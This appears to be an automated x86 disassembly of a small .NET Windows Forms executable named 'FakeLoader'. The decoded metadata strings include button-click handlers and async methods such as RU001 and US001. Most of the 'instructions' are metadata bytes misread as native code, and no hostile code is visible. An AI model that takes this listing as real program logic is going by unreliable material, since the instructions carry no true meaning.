  405d96:	01 11                	add    %edx,(%ecx)
  405d98:	3c 04                	cmp    $0x4,%al
  405d9a:	0a 01                	or     (%ecx),%al
  405d9c:	11 3c 04             	adc    %edi,(%esp,%eax,1)
  405d9f:	07                   	pop    %es
  405da0:	01 11                	add    %edx,(%ecx)
  405da2:	4c                   	dec    %esp
  405da3:	04 0a                	add    $0xa,%al
  405da5:	01 11                	add    %edx,(%ecx)
  405da7:	4c                   	dec    %esp
  405da8:	04 07                	add    $0x7,%al
  405daa:	01 11                	add    %edx,(%ecx)
  405dac:	40                   	inc    %eax
  405dad:	04 0a                	add    $0xa,%al
  405daf:	01 11                	add    %edx,(%ecx)
  405db1:	40                   	inc    %eax
  405db2:	05 20 01 01 12       	add    $0x12010120,%eax
  405db7:	6d                   	insl   (%dx),%es:(%edi)
  405db8:	08 00                	or     %al,(%eax)
  405dba:	03 11                	add    (%ecx),%edx
  405dbc:	80 b9 08 08 08 06 20 	cmpb   $0x20,0x6080808(%ecx)
  405dc3:	01 01                	add    %eax,(%ecx)
  405dc5:	11 80 b9 05 20 00    	adc    %eax,0x2005b9(%eax)
  405dcb:	12 81 01 06 20 01    	adc    0x1200601(%ecx),%al
  405dd1:	01 12                	add    %edx,(%edx)
  405dd3:	80 fd 06             	cmp    $0x6,%ch
  405dd6:	20 01                	and    %al,(%ecx)
  405dd8:	01 11                	add    %edx,(%ecx)
  405dda:	81 05 05 20 02 01 08 	addl   $0x20060808,0x1022005
  405de1:	08 06 20 
  405de4:	01 01                	add    %eax,(%ecx)
  405de6:	11 81 09 06 20 01    	adc    %eax,0x1200609(%ecx)
  405dec:	01 11                	add    %edx,(%ecx)
  405dee:	81 0d 05 00 00 11 80 	orl    $0x2006b980,0x11000005
  405df5:	b9 06 20 
  405df8:	01 01                	add    %eax,(%ecx)
  405dfa:	11 81 11 06 20 01    	adc    %eax,0x1200611(%ecx)
  405e00:	01 11                	add    %edx,(%ecx)
  405e02:	81 15 08 20 03 01 0e 	adcl   $0x81110c0e,0x1032008
  405e09:	0c 11 81 
  405e0c:	1d 06 20 01 01       	sbb    $0x1012006,%eax
  405e11:	12 81 19 05 20 02    	adc    0x2200519(%ecx),%al
  405e17:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  405e1a:	06                   	push   %es
  405e1b:	20 01                	and    %al,(%ecx)
  405e1d:	01 12                	add    %edx,(%edx)
  405e1f:	81 21 06 20 01 01    	andl   $0x1012006,(%ecx)
  405e25:	11 81 25 06 20 01    	adc    %eax,0x1200625(%ecx)
  405e2b:	01 12                	add    %edx,(%edx)
  405e2d:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  405e33:	0d 05 20 02 01       	or     $0x1022005,%eax
  405e38:	0c 0c                	or     $0xc,%al
  405e3a:	06                   	push   %es
  405e3b:	20 01                	and    %al,(%ecx)
  405e3d:	01 11                	add    %edx,(%ecx)
  405e3f:	81 2d 06 20 01 01 11 	subl   $0x6318111,0x1012006
  405e46:	81 31 06 
  405e49:	20 01                	and    %al,(%ecx)
  405e4b:	01 11                	add    %edx,(%ecx)
  405e4d:	81 35 06 20 01 01 11 	xorl   $0x3398111,0x1012006
  405e54:	81 39 03 
  405e57:	20 00                	and    %al,(%eax)
  405e59:	02 06                	add    (%esi),%al
  405e5b:	20 01                	and    %al,(%ecx)
  405e5d:	1c 12                	sbb    $0x12,%al
  405e5f:	81 3d 10 07 07 12 80 	cmpl   $0x8012b180,0x12070710
  405e66:	b1 12 80 
  405e69:	b5 08                	mov    $0x8,%ch
  405e6b:	08 11                	or     %dl,(%ecx)
  405e6d:	80 b9 05 1d 05 07 20 	cmpb   $0x20,0x7051d05(%ecx)
  405e74:	02 11                	add    (%ecx),%dl
  405e76:	80 b9 08 08 03 20 00 	cmpb   $0x0,0x20030808(%ecx)
  405e7d:	05 04 20 01 01       	add    $0x1012004,%eax
  405e82:	05 03 20 00 08       	add    $0x8002003,%eax
  405e87:	04 20                	add    $0x20,%al
  405e89:	00 1d 05 10 07 05    	add    %bl,0x5071005
  405e8f:	12 80 bd 12 80 91    	adc    -0x6e7fed43(%eax),%al
  405e95:	1d 12 80 91 08       	sbb    $0x8918012,%eax
  405e9a:	12 80 c1 07 00 01    	adc    0x10007c1(%eax),%al
  405ea0:	12 80 bd 1d 05 06    	adc    0x6051dbd(%eax),%al
  405ea6:	20 01                	and    %al,(%ecx)
  405ea8:	12 80 91 0e 09 00    	adc    0x90e91(%eax),%al
  405eae:	02 02                	add    (%edx),%al
  405eb0:	12 80 91 12 80 91    	adc    -0x6e7fed6f(%eax),%al
  405eb6:	09 20                	or     %esp,(%eax)
  405eb8:	02 12                	add    (%edx),%dl
  405eba:	80 c1 0e             	add    $0xe,%cl
  405ebd:	11 81 49 06 20 02    	adc    %eax,0x2200649(%ecx)
  405ec3:	1c 1c                	sbb    $0x1c,%al
  405ec5:	1d 1c 06 20 00       	sbb    $0x20061c,%eax
  405eca:	1d 12 80 91 09       	sbb    $0x9918012,%eax
  405ecf:	00 02                	add    %al,(%edx)
  405ed1:	02 12                	add    (%edx),%dl
  405ed3:	80 c1 12             	add    $0x12,%cl
  405ed6:	80 c1 04             	add    $0x4,%cl
  405ed9:	07                   	pop    %es
  405eda:	01 11                	add    %edx,(%ecx)
  405edc:	54                   	push   %esp
  405edd:	04 0a                	add    $0xa,%al
  405edf:	01 11                	add    %edx,(%ecx)
  405ee1:	54                   	push   %esp
  405ee2:	04 07                	add    $0x7,%al
  405ee4:	01 11                	add    %edx,(%ecx)
  405ee6:	58                   	pop    %eax
  405ee7:	04 0a                	add    $0xa,%al
  405ee9:	01 11                	add    %edx,(%ecx)
  405eeb:	58                   	pop    %eax
  405eec:	04 00                	add    $0x0,%al
  405eee:	01 02                	add    %eax,(%edx)
  405ef0:	0e                   	push   %cs
  405ef1:	0f 07                	sysret
  405ef3:	04 08                	add    $0x8,%al
  405ef5:	1d 05 15 11 80       	sbb    $0x80111505,%eax
  405efa:	dd 01                	fldl   (%ecx)
  405efc:	1d 05 12 80 d1       	sbb    $0xd1801205,%eax
  405f01:	07                   	pop    %es
  405f02:	15 12 81 55 01       	adc    $0x1558112,%eax
  405f07:	1d 05 11 10 01       	sbb    $0x1101105,%eax
  405f0c:	01 15 12 80 99 01    	add    %edx,0x1998012
  405f12:	1e                   	push   %ds
  405f13:	00 15 12 81 55 01    	add    %dl,0x1558112
  405f19:	1e                   	push   %ds
  405f1a:	00 04 0a             	add    %al,(%edx,%ecx,1)
  405f1d:	01 1d 05 07 15 12    	add    %ebx,0x12150705
  405f23:	80 99 01 1d 05 09 20 	sbbb   $0x20,0x9051d01(%ecx)
  405f2a:	00 15 11 80 dd 01    	add    %dl,0x1dd8011
  405f30:	13 00                	adc    (%eax),%eax
  405f32:	07                   	pop    %es
  405f33:	15 11 80 dd 01       	adc    $0x1dd8011,%eax
  405f38:	1d 05 0a 30 02       	sbb    $0x2300a05,%eax
  405f3d:	02 01                	add    (%ecx),%al
  405f3f:	10 1e                	adc    %bl,(%esi)
  405f41:	00 10                	add    %dl,(%eax)
  405f43:	1e                   	push   %ds
  405f44:	01 0b                	add    %ecx,(%ebx)
  405f46:	0a 02                	or     (%edx),%al
  405f48:	15 11 80 dd 01       	adc    $0x1dd8011,%eax
  405f4d:	1d 05 11 30 04       	sbb    $0x4301105,%eax
  405f52:	20 00                	and    %al,(%eax)
  405f54:	13 00                	adc    (%eax),%eax
  405f56:	06                   	push   %es
  405f57:	20 01                	and    %al,(%ecx)
  405f59:	01 12                	add    %edx,(%edx)
  405f5b:	80 d1 05             	adc    $0x5,%cl
  405f5e:	20 01                	and    %al,(%ecx)
  405f60:	01 13                	add    %edx,(%ebx)
  405f62:	00 0b                	add    %cl,(%ebx)
  405f64:	07                   	pop    %es
  405f65:	04 08                	add    $0x8,%al
  405f67:	12 14 11             	adc    (%ecx,%edx,1),%dl
  405f6a:	80 cd 12             	or     $0x12,%ch
  405f6d:	80 d1 08             	adc    $0x8,%cl
  405f70:	15 12 81 55 01       	adc    $0x1558112,%eax
  405f75:	12 80 9d 05 20 00    	adc    0x20059d(%eax),%al
  405f7b:	11 80 cd 07 0a 02    	adc    %eax,0x20a07cd(%eax)
  405f81:	11 80 cd 11 34 06    	adc    %eax,0x63411cd(%eax)
  405f87:	00 01                	add    %al,(%ecx)
  405f89:	12 80 9d 08 0d 07    	adc    0x70d089d(%eax),%al
  405f8f:	04 08                	add    $0x8,%al
  405f91:	02 15 11 80 dd 01    	add    0x1dd8011,%dl
  405f97:	02 12                	add    (%edx),%dl
  405f99:	80 d1 06             	adc    $0x6,%cl
  405f9c:	15 12 81 55 01       	adc    $0x1558112,%eax
  405fa1:	02 03                	add    (%ebx),%al
  405fa3:	0a 01                	or     (%ecx),%al
  405fa5:	02 06                	add    (%esi),%al
  405fa7:	15 12 80 99 01       	adc    $0x1998012,%eax
  405fac:	02 06                	add    (%esi),%al
  405fae:	15 11 80 dd 01       	adc    $0x1dd8011,%eax
  405fb3:	02 0a                	add    (%edx),%cl
  405fb5:	0a 02                	or     (%edx),%al
  405fb7:	15 11 80 dd 01       	adc    $0x1dd8011,%eax
  405fbc:	02 11                	add    (%ecx),%dl
  405fbe:	38 1e                	cmp    %bl,(%esi)
  405fc0:	07                   	pop    %es
  405fc1:	09 08                	or     %ecx,(%eax)
  405fc3:	12 14 1d 05 11 80 cd 	adc    -0x327feefb(,%ebx,1),%dl
  405fca:	15 11 80 dd 01       	adc    $0x1dd8011,%eax
  405fcf:	02 15 11 80 dd 01    	add    0x1dd8011,%dl
  405fd5:	1d 05 12 80 d1       	sbb    $0xd1801205,%eax
  405fda:	08 12                	or     %dl,(%edx)
  405fdc:	80 d1 07             	adc    $0x7,%cl
  405fdf:	0a 02                	or     (%edx),%al
  405fe1:	11 80 cd 11 3c 05    	adc    %eax,0x53c11cd(%eax)
  405fe7:	00 00                	add    %al,(%eax)
  405fe9:	12 81 59 03 20 00    	adc    0x200359(%ecx),%al
  405fef:	0e                   	push   %cs
  405ff0:	06                   	push   %es
  405ff1:	00 03                	add    %al,(%ebx)
  405ff3:	0e                   	push   %cs
  405ff4:	0e                   	push   %cs
  405ff5:	0e                   	push   %cs
  405ff6:	0e                   	push   %cs
  405ff7:	0a 0a                	or     (%edx),%cl
  405ff9:	02 15 11 80 dd 01    	add    0x1dd8011,%dl
  405fff:	02 11                	add    (%ecx),%dl
  406001:	3c 0b                	cmp    $0xb,%al
  406003:	0a 02                	or     (%edx),%al
  406005:	15 11 80 dd 01       	adc    $0x1dd8011,%eax
  40600a:	1d 05 11 3c 08       	sbb    $0x83c1105,%eax
  40600f:	00 01                	add    %al,(%ecx)
  406011:	12 80 9d 12 80 ad    	adc    -0x527fed63(%eax),%al
  406017:	07                   	pop    %es
  406018:	0a 02                	or     (%edx),%al
  40601a:	11 80 cd 11 40 09    	adc    %eax,0x94011cd(%eax)
  406020:	07                   	pop    %es
  406021:	03 08                	add    (%eax),%ecx
  406023:	11 80 cd 12 80 d1    	adc    %eax,-0x2e7fed33(%eax)
  406029:	07                   	pop    %es
  40602a:	0a 02                	or     (%edx),%al
  40602c:	11 80 cd 11 44 0d    	adc    %eax,0xd4411cd(%eax)
  406032:	07                   	pop    %es
  406033:	05 08 12 14 12       	add    $0x12141208,%eax
  406038:	28 11                	sub    %dl,(%ecx)
  40603a:	80 cd 12             	or     $0x12,%ch
  40603d:	80 d1 07             	adc    $0x7,%cl
  406040:	0a 02                	or     (%edx),%al
  406042:	11 80 cd 11 48 0d    	adc    %eax,0xd4811cd(%eax)
  406048:	00 04 11             	add    %al,(%ecx,%edx,1)
  40604b:	81 65 0e 0e 11 80 a1 	andl   $0xa180110e,0xe(%ebp)
  406052:	11 80 a5 07 0a 02    	adc    %eax,0x20a07a5(%eax)
  406058:	11 80 cd 11 4c 07    	adc    %eax,0x74c11cd(%eax)
  40605e:	0a 02                	or     (%edx),%al
  406060:	11 80 cd 11 50 0b    	adc    %eax,0xb5011cd(%eax)
  406066:	07                   	pop    %es
  406067:	04 08                	add    $0x8,%al
  406069:	12 24 11             	adc    (%ecx,%edx,1),%ah
  40606c:	80 cd 12             	or     $0x12,%ch
  40606f:	80 d1 07             	adc    $0x7,%cl
  406072:	0a 02                	or     (%edx),%al
  406074:	11 80 cd 11 54 0b    	adc    %eax,0xb5411cd(%eax)
  40607a:	07                   	pop    %es
  40607b:	04 08                	add    $0x8,%al
  40607d:	12 28                	adc    (%eax),%ch
  40607f:	11 80 cd 12 80 d1    	adc    %eax,-0x2e7fed33(%eax)
  406085:	07                   	pop    %es
  406086:	0a 02                	or     (%edx),%al
  406088:	11 80 cd 11 58 08    	adc    %eax,0x85811cd(%eax)
  40608e:	b7 7a                	mov    $0x7a,%bh
  406090:	5c                   	pop    %esp
  406091:	56                   	push   %esi
  406092:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  406095:	89 08                	mov    %ecx,(%eax)
  406097:	8b 9d 14 aa 51 42    	mov    0x4251aa14(%ebp),%ebx
  40609d:	e2 61                	loop   0x406100
  40609f:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  4060a5:	d5 0a                	aad    $0xa
  4060a7:	3a 03                	cmp    (%ebx),%al
  4060a9:	06                   	push   %es
  4060aa:	12 55 03             	adc    0x3(%ebp),%dl
  4060ad:	06                   	push   %es
  4060ae:	12 59 03             	adc    0x3(%ecx),%bl
  4060b1:	06                   	push   %es
  4060b2:	12 10                	adc    (%eax),%dl
  4060b4:	03 06                	add    (%esi),%eax
  4060b6:	12 6d 03             	adc    0x3(%ebp),%ch
  4060b9:	06                   	push   %es
  4060ba:	12 71 03             	adc    0x3(%ecx),%dh
  4060bd:	06                   	push   %es
  4060be:	12 75 03             	adc    0x3(%ebp),%dh
  4060c1:	06                   	push   %es
  4060c2:	12 79 03             	adc    0x3(%ecx),%bh
  4060c5:	06                   	push   %es
  4060c6:	12 7d 04             	adc    0x4(%ebp),%bh
  4060c9:	06                   	push   %es
  4060ca:	12 80 81 04 06 12    	adc    0x12060481(%eax),%al
  4060d0:	80 85 04 06 12 80 89 	addb   $0x89,-0x7fedf9fc(%ebp)
  4060d7:	04 06                	add    $0x6,%al
  4060d9:	12 80 8d 03 06 12    	adc    0x1206038d(%eax),%al
  4060df:	18 04 06             	sbb    %al,(%esi,%eax,1)
  4060e2:	12 80 ad 02 06 0e    	adc    0xe0602ad(%eax),%al
  4060e8:	03 06                	add    (%esi),%eax
  4060ea:	1d 05 03 06 12       	sbb    $0x12060305,%eax
  4060ef:	14 02                	adc    $0x2,%al
  4060f1:	06                   	push   %es
  4060f2:	08 04 06             	or     %al,(%esi,%eax,1)
  4060f5:	11 80 a1 04 06 11    	adc    %eax,0x110604a1(%eax)
  4060fb:	80 a5 08 06 15 11 80 	andb   $0x80,0x11150608(%ebp)
  406102:	e1 01                	loope  0x406105
  406104:	1d 05 08 06 15       	sbb    $0x15060805,%eax
  406109:	11 80 dd 01 1d 05    	adc    %eax,0x51d01dd(%eax)
  40610f:	04 06                	add    $0x6,%al
  406111:	11 80 d5 03 06 12    	adc    %eax,0x120603d5(%eax)
  406117:	24 04                	and    $0x4,%al
  406119:	06                   	push   %es
  40611a:	11 80 cd 07 06 15    	adc    %eax,0x150607cd(%eax)
  406120:	11 80 e1 01 02 07    	adc    %eax,0x70201e1(%eax)
  406126:	06                   	push   %es
  406127:	15 11 80 dd 01       	adc    $0x1dd8011,%eax
  40612c:	02 02                	add    (%edx),%al
  40612e:	06                   	push   %es
  40612f:	1c 04                	sbb    $0x4,%al
  406131:	06                   	push   %es
  406132:	11 80 e5 03 06 12    	adc    %eax,0x120603e5(%eax)
  406138:	28 04 00             	sub    %al,(%eax,%eax,1)
  40613b:	00 12                	add    %dl,(%edx)
  40613d:	55                   	push   %ebp
  40613e:	04 00                	add    $0x0,%al
  406140:	00 12                	add    %dl,(%edx)
  406142:	59                   	pop    %ecx
  406143:	05 00 01 01 12       	add    $0x12010100,%eax
  406148:	59                   	pop    %ecx
  406149:	04 00                	add    $0x0,%al
  40614b:	00 12                	add    %dl,(%edx)
  40614d:	10 0a                	adc    %cl,(%edx)
  40614f:	20 01                	and    %al,(%ecx)
  406151:	15 12 80 99 01       	adc    $0x1998012,%eax
  406156:	1d 05 0e 07 20       	sbb    $0x20070e05,%eax
  40615b:	01 12                	add    %edx,(%edx)
  40615d:	80 9d 1d 05 06 20 01 	sbbb   $0x1,0x2006051d(%ebp)
  406164:	12 80 9d 08 0d 20    	adc    0x200d089d(%eax),%al
  40616a:	04 12                	add    $0x12,%al
  40616c:	80 9d 0e 0e 11 80 a1 	sbbb   $0xa1,-0x7feef1f2(%ebp)
  406173:	11 80 a5 09 20 01    	adc    %eax,0x12009a5(%eax)
  406179:	15 12 80 99 01       	adc    $0x1998012,%eax
  40617e:	02 0e                	add    (%esi),%cl
  406180:	07                   	pop    %es
  406181:	20 02                	and    %al,(%edx)
  406183:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  406186:	80 a9 04 08 00 12 55 	subb   $0x55,0x12000804(%ecx)
  40618d:	04 08                	add    $0x8,%al
  40618f:	00 12                	add    %dl,(%edx)
  406191:	59                   	pop    %ecx
  406192:	04 08                	add    $0x8,%al
  406194:	00 12                	add    %dl,(%edx)
  406196:	10 08                	adc    %cl,(%eax)
  406198:	01 00                	add    %eax,(%eax)
  40619a:	08 00                	or     %al,(%eax)
  40619c:	00 00                	add    %al,(%eax)
  40619e:	00 00                	add    %al,(%eax)
  4061a0:	1e                   	push   %ds
  4061a1:	01 00                	add    %eax,(%eax)
  4061a3:	01 00                	add    %eax,(%eax)
  4061a5:	54                   	push   %esp
  4061a6:	02 16                	add    (%esi),%dl
  4061a8:	57                   	push   %edi
  4061a9:	72 61                	jb     0x40620c
  4061ab:	70 4e                	jo     0x4061fb
  4061ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4061ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4061af:	45                   	inc    %ebp
  4061b0:	78 63                	js     0x406215
  4061b2:	65 70 74             	gs jo  0x406229
  4061b5:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  4061bc:	77 73                	ja     0x406231
  4061be:	01 08                	add    %ecx,(%eax)
  4061c0:	01 00                	add    %eax,(%eax)
  4061c2:	02 00                	add    (%eax),%al
  4061c4:	00 00                	add    %al,(%eax)
  4061c6:	00 00                	add    %al,(%eax)
  4061c8:	15 01 00 10 57       	adc    $0x57100001,%eax
  4061cd:	69 6e 64 6f 77 73 46 	imul   $0x4673776f,0x64(%esi),%ebp
  4061d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4061d5:	72 6d                	jb     0x406244
  4061d7:	73 41                	jae    0x40621a
  4061d9:	70 70                	jo     0x40624b
  4061db:	31 00                	xor    %eax,(%eax)
  4061dd:	00 05 01 00 00 00    	add    %al,0x1
  4061e3:	00 17                	add    %dl,(%edi)
  4061e5:	01 00                	add    %eax,(%eax)
  4061e7:	12 43 6f             	adc    0x6f(%ebx),%al
  4061ea:	70 79                	jo     0x406265
  4061ec:	72 69                	jb     0x406257
  4061ee:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  4061f4:	20 20                	and    %ah,(%eax)
  4061f6:	32 30                	xor    (%eax),%dh
  4061f8:	32 36                	xor    (%esi),%dh
  4061fa:	00 00                	add    %al,(%eax)
  4061fc:	29 01                	sub    %eax,(%ecx)
  4061fe:	00 24 38             	add    %ah,(%eax,%edi,1)
  406201:	33 30                	xor    (%eax),%esi
  406203:	35 32 39 38 33       	xor    $0x33383932,%eax
  406208:	2d 36 63 62 36       	sub    $0x36626336,%eax
  40620d:	2d 34 31 63 38       	sub    $0x38633134,%eax
  406212:	2d 61 36 36 35       	sub    $0x35363661,%eax
  406217:	2d 36 32 64 39       	sub    $0x39643236,%eax
  40621c:	38 63 36             	cmp    %ah,0x36(%ebx)
  40621f:	30 62 62             	xor    %ah,0x62(%edx)
  406222:	32 61 00             	xor    0x0(%ecx),%ah
  406225:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  406228:	00 07                	add    %al,(%edi)
  40622a:	31 2e                	xor    %ebp,(%esi)
  40622c:	30 2e                	xor    %ch,(%esi)
  40622e:	30 2e                	xor    %ch,(%esi)
  406230:	30 00                	xor    %al,(%eax)
  406232:	00 49 01             	add    %cl,0x1(%ecx)
  406235:	00 1a                	add    %bl,(%edx)
  406237:	2e 4e                	cs dec %esi
  406239:	45                   	inc    %ebp
  40623a:	54                   	push   %esp
  40623b:	46                   	inc    %esi
  40623c:	72 61                	jb     0x40629f
  40623e:	6d                   	insl   (%dx),%es:(%edi)
  40623f:	65 77 6f             	gs ja  0x4062b1
  406242:	72 6b                	jb     0x4062af
  406244:	2c 56                	sub    $0x56,%al
  406246:	65 72 73             	gs jb  0x4062bc
  406249:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  406250:	38 01                	cmp    %al,(%ecx)
  406252:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  406256:	46                   	inc    %esi
  406257:	72 61                	jb     0x4062ba
  406259:	6d                   	insl   (%dx),%es:(%edi)
  40625a:	65 77 6f             	gs ja  0x4062cc
  40625d:	72 6b                	jb     0x4062ca
  40625f:	44                   	inc    %esp
  406260:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  406267:	61                   	popa
  406268:	6d                   	insl   (%dx),%es:(%edi)
  406269:	65 12 2e             	adc    %gs:(%esi),%ch
  40626c:	4e                   	dec    %esi
  40626d:	45                   	inc    %ebp
  40626e:	54                   	push   %esp
  40626f:	20 46 72             	and    %al,0x72(%esi)
  406272:	61                   	popa
  406273:	6d                   	insl   (%dx),%es:(%edi)
  406274:	65 77 6f             	gs ja  0x4062e6
  406277:	72 6b                	jb     0x4062e4
  406279:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  40627c:	38 04 01             	cmp    %al,(%ecx,%eax,1)
  40627f:	00 00                	add    %al,(%eax)
  406281:	00 21                	add    %ah,(%ecx)
  406283:	01 00                	add    %eax,(%eax)
  406285:	1c 46                	sbb    $0x46,%al
  406287:	61                   	popa
  406288:	6b 65 4c 6f          	imul   $0x6f,0x4c(%ebp),%esp
  40628c:	61                   	popa
  40628d:	64 65 72 2e          	fs gs jb 0x4062bf
  406291:	46                   	inc    %esi
  406292:	6f                   	outsl  %ds:(%esi),(%dx)
  406293:	72 6d                	jb     0x406302
  406295:	31 2b                	xor    %ebp,(%ebx)
  406297:	3c 52                	cmp    $0x52,%al
  406299:	55                   	push   %ebp
  40629a:	30 30                	xor    %dh,(%eax)
  40629c:	31 3e                	xor    %edi,(%esi)
  40629e:	64 5f                	fs pop %edi
  4062a0:	5f                   	pop    %edi
  4062a1:	31 00                	xor    %eax,(%eax)
  4062a3:	00 21                	add    %ah,(%ecx)
  4062a5:	01 00                	add    %eax,(%eax)
  4062a7:	1c 46                	sbb    $0x46,%al
  4062a9:	61                   	popa
  4062aa:	6b 65 4c 6f          	imul   $0x6f,0x4c(%ebp),%esp
  4062ae:	61                   	popa
  4062af:	64 65 72 2e          	fs gs jb 0x4062e1
  4062b3:	46                   	inc    %esi
  4062b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4062b5:	72 6d                	jb     0x406324
  4062b7:	31 2b                	xor    %ebp,(%ebx)
  4062b9:	3c 55                	cmp    $0x55,%al
  4062bb:	53                   	push   %ebx
  4062bc:	30 30                	xor    %dh,(%eax)
  4062be:	31 3e                	xor    %edi,(%esi)
  4062c0:	64 5f                	fs pop %edi
  4062c2:	5f                   	pop    %edi
  4062c3:	32 00                	xor    (%eax),%al
  4062c5:	00 21                	add    %ah,(%ecx)
  4062c7:	01 00                	add    %eax,(%eax)
  4062c9:	1c 46                	sbb    $0x46,%al
  4062cb:	61                   	popa
  4062cc:	6b 65 4c 6f          	imul   $0x6f,0x4c(%ebp),%esp
  4062d0:	61                   	popa
  4062d1:	64 65 72 2e          	fs gs jb 0x406303
  4062d5:	46                   	inc    %esi
  4062d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4062d7:	72 6d                	jb     0x406346
  4062d9:	31 2b                	xor    %ebp,(%ebx)
  4062db:	3c 52                	cmp    $0x52,%al
  4062dd:	55                   	push   %ebp
  4062de:	30 30                	xor    %dh,(%eax)
  4062e0:	32 3e                	xor    (%esi),%bh
  4062e2:	64 5f                	fs pop %edi
  4062e4:	5f                   	pop    %edi
  4062e5:	33 00                	xor    (%eax),%eax
  4062e7:	00 21                	add    %ah,(%ecx)
  4062e9:	01 00                	add    %eax,(%eax)
  4062eb:	1c 46                	sbb    $0x46,%al
  4062ed:	61                   	popa
  4062ee:	6b 65 4c 6f          	imul   $0x6f,0x4c(%ebp),%esp
  4062f2:	61                   	popa
  4062f3:	64 65 72 2e          	fs gs jb 0x406325
  4062f7:	46                   	inc    %esi
  4062f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4062f9:	72 6d                	jb     0x406368
  4062fb:	31 2b                	xor    %ebp,(%ebx)
  4062fd:	3c 55                	cmp    $0x55,%al
  4062ff:	53                   	push   %ebx
  406300:	30 30                	xor    %dh,(%eax)
  406302:	32 3e                	xor    (%esi),%bh
  406304:	64 5f                	fs pop %edi
  406306:	5f                   	pop    %edi
  406307:	34 00                	xor    $0x0,%al
  406309:	00 21                	add    %ah,(%ecx)
  40630b:	01 00                	add    %eax,(%eax)
  40630d:	1c 46                	sbb    $0x46,%al
  40630f:	61                   	popa
  406310:	6b 65 4c 6f          	imul   $0x6f,0x4c(%ebp),%esp
  406314:	61                   	popa
  406315:	64 65 72 2e          	fs gs jb 0x406347
  406319:	46                   	inc    %esi
  40631a:	6f                   	outsl  %ds:(%esi),(%dx)
  40631b:	72 6d                	jb     0x40638a
  40631d:	31 2b                	xor    %ebp,(%ebx)
  40631f:	3c 52                	cmp    $0x52,%al
  406321:	55                   	push   %ebp
  406322:	30 30                	xor    %dh,(%eax)
  406324:	33 3e                	xor    (%esi),%edi
  406326:	64 5f                	fs pop %edi
  406328:	5f                   	pop    %edi
  406329:	35 00 00 2e 01       	xor    $0x12e0000,%eax
  40632e:	00 29                	add    %ch,(%ecx)
  406330:	46                   	inc    %esi
  406331:	61                   	popa
  406332:	6b 65 4c 6f          	imul   $0x6f,0x4c(%ebp),%esp
  406336:	61                   	popa
  406337:	64 65 72 2e          	fs gs jb 0x406369
  40633b:	46                   	inc    %esi
  40633c:	6f                   	outsl  %ds:(%esi),(%dx)
  40633d:	72 6d                	jb     0x4063ac
  40633f:	31 2b                	xor    %ebp,(%ebx)
  406341:	3c 67                	cmp    $0x67,%al
  406343:	75 6e                	jne    0x4063b3
  406345:	61                   	popa
  406346:	32 42 75             	xor    0x75(%edx),%al
  406349:	74 74                	je     0x4063bf
  40634b:	6f                   	outsl  %ds:(%esi),(%dx)
  40634c:	6e                   	outsb  %ds:(%esi),(%dx)
  40634d:	32 5f 43             	xor    0x43(%edi),%bl
  406350:	6c                   	insb   (%dx),%es:(%edi)
  406351:	69 63 6b 3e 64 5f 5f 	imul   $0x5f5f643e,0x6b(%ebx),%esp
  406358:	36 00 00             	add    %al,%ss:(%eax)
  40635b:	21 01                	and    %eax,(%ecx)
  40635d:	00 1c 46             	add    %bl,(%esi,%eax,2)
  406360:	61                   	popa
  406361:	6b 65 4c 6f          	imul   $0x6f,0x4c(%ebp),%esp
  406365:	61                   	popa
  406366:	64 65 72 2e          	fs gs jb 0x406398
  40636a:	46                   	inc    %esi
  40636b:	6f                   	outsl  %ds:(%esi),(%dx)
  40636c:	72 6d                	jb     0x4063db
  40636e:	31 2b                	xor    %ebp,(%ebx)
  406370:	3c 52                	cmp    $0x52,%al
  406372:	55                   	push   %ebp
  406373:	30 30                	xor    %dh,(%eax)
  406375:	34 3e                	xor    $0x3e,%al
  406377:	64 5f                	fs pop %edi
  406379:	5f                   	pop    %edi
  40637a:	37                   	aaa
  40637b:	00 00                	add    %al,(%eax)
  40637d:	2e 01 00             	add    %eax,%cs:(%eax)
  406380:	29 46 61             	sub    %eax,0x61(%esi)
  406383:	6b 65 4c 6f          	imul   $0x6f,0x4c(%ebp),%esp
  406387:	61                   	popa
  406388:	64 65 72 2e          	fs gs jb 0x4063ba
  40638c:	46                   	inc    %esi
  40638d:	6f                   	outsl  %ds:(%esi),(%dx)
  40638e:	72 6d                	jb     0x4063fd
  406390:	31 2b                	xor    %ebp,(%ebx)
  406392:	3c 67                	cmp    $0x67,%al
  406394:	75 6e                	jne    0x406404
  406396:	61                   	popa
  406397:	32 42 75             	xor    0x75(%edx),%al
  40639a:	74 74                	je     0x406410
  40639c:	6f                   	outsl  %ds:(%esi),(%dx)
  40639d:	6e                   	outsb  %ds:(%esi),(%dx)
  40639e:	31 5f 43             	xor    %ebx,0x43(%edi)
  4063a1:	6c                   	insb   (%dx),%es:(%edi)
  4063a2:	69 63 6b 3e 64 5f 5f 	imul   $0x5f5f643e,0x6b(%ebx),%esp
  4063a9:	38 00                	cmp    %al,(%eax)
  4063ab:	00 21                	add    %ah,(%ecx)
  4063ad:	01 00                	add    %eax,(%eax)
  4063af:	1c 46                	sbb    $0x46,%al
  4063b1:	61                   	popa
  4063b2:	6b 65 4c 6f          	imul   $0x6f,0x4c(%ebp),%esp
  4063b6:	61                   	popa
  4063b7:	64 65 72 2e          	fs gs jb 0x4063e9
  4063bb:	46                   	inc    %esi
  4063bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4063bd:	72 6d                	jb     0x40642c
  4063bf:	31 2b                	xor    %ebp,(%ebx)
  4063c1:	3c 52                	cmp    $0x52,%al
  4063c3:	55                   	push   %ebp
  4063c4:	30 30                	xor    %dh,(%eax)
